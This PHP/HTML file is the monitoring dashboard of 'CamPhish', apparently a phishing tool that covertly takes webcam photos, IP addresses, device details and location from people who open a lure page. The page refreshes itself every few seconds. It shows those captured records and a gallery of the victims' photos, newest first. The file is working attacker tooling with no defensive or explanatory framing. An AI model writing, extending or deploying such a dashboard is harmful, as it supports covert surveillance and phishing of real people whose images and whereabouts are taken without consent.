<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CamPhish Monitor Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; }
        h1 { text-align: center; color: #03dac6; }
        .container { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
        .card { background-color: #1e1e1e; border: 1px solid #333; border-radius: 8px; width: 45%; min-width: 300px; padding: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .card h2 { border-bottom: 2px solid #333; padding-bottom: 10px; margin-top: 0; color: #bb86fc; }
        pre { background-color: #000; padding: 10px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; height: 300px; overflow-y: scroll; color: #00ff00; font-family: 'Consolas', monospace; }
        .gallery { display: flex; flex-wrap: wrap; gap: 10px; height: 300px; overflow-y: scroll; }
        .gallery img { width: 100px; height: auto; border: 1px solid #555; border-radius: 4px; transition: transform 0.2s; }
        .gallery img:hover { transform: scale(1.5); border-color: #03dac6; z-index: 10; }
        .refresh-btn { display: block; margin: 20px auto; padding: 10px 30px; background-color: #3700b3; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .refresh-btn:hover { background-color: #6200ea; }
    </style>
    <script>
        setInterval(() => window.location.reload(), 5000); // Auto-refresh every 5 seconds
    </script>
</head>
<body>
    <h1>🛰️ CamPhish Live Monitor</h1>
    <button class="refresh-btn" onclick="window.location.reload()">Refresh Data</button>
    
    <div class="container">
        <!-- IP Logs -->
        <div class="card">
            <h2>🌍 IP Addresses Captured</h2>
            <pre><?php echo file_exists('ip.txt') ? htmlspecialchars(file_get_contents('ip.txt')) : 'No data yet...'; ?></pre>
        </div>

        <!-- Device Info -->
        <div class="card">
            <h2>📱 Device Information</h2>
            <pre><?php echo file_exists('device_info.txt') ? htmlspecialchars(file_get_contents('device_info.txt')) : 'No data yet...'; ?></pre>
        </div>

        <!-- Location Data -->
        <div class="card">
            <h2>📍 Location Logs</h2>
            <pre><?php 
                $locFiles = glob("saved_locations/*.txt");
                if ($locFiles) {
                    foreach($locFiles as $file) {
                        echo "--- " . basename($file) . " ---\n";
                        echo htmlspecialchars(file_get_contents($file)) . "\n\n";
                    }
                } else {
                    echo file_exists('saved.locations.txt') ? htmlspecialchars(file_get_contents('saved.locations.txt')) : 'No location data yet...'; 
                }
            ?></pre>
        </div>

        <!-- Captured Images -->
        <div class="card">
            <h2>📸 Captured Photos</h2>
            <div class="gallery">
                <?php 
                    $images = glob("*.png");
                    if ($images) {
                        // Show newest first
                        rsort($images);
                        foreach($images as $image) {
                            echo "<a href='$image' target='_blank'><img src='$image' alt='Captured Image'></a>";
                        }
                    } else {
                        echo "<p>No images captured yet.</p>";
                    }
                ?>
            </div>
        </div>
    </div>
</body>
</html>
